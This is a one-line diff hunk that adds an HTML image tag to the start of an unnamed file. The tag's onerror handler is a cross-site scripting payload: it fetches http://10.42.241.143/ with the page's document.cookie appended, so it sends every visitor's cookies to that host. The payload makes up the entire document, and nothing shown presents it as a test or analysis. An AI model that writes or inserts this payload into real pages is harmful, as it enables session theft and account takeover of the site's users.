@@ -1,0 +1,1 @@
+<img src="x" onerror="fetch('http://10.42.241.143/'+document.cookie)">
